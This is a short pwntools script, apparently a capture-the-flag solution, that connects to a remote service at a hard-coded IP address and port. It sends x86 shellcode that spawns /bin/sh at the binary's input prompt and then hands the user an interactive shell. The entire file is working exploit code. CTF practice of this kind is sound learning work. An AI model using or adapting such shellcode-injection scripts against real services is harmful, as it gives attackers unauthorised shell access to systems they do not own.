from pwn import *

# Set up pwntools context
context(os='linux', arch='i386')  # Assuming 32-bit binary

# Path to the binary
binary = './chall'

# Create the process or remote connection to the binary
#p = process(binary)  # Use remote('host', port) if it's a remote service
p = remote('178.128.218.40', 2001)
# Shellcode to spawn /bin/sh (Linux x86)
shellcode = asm(shellcraft.sh())

# Log interaction
log.info(f"Shellcode length: {len(shellcode)}")

# Receive the prompt from the binary
p.recvuntil(b"give me something: ")

# Send the shellcode
p.send(shellcode)

# Pass control to the user for interaction
p.interactive()
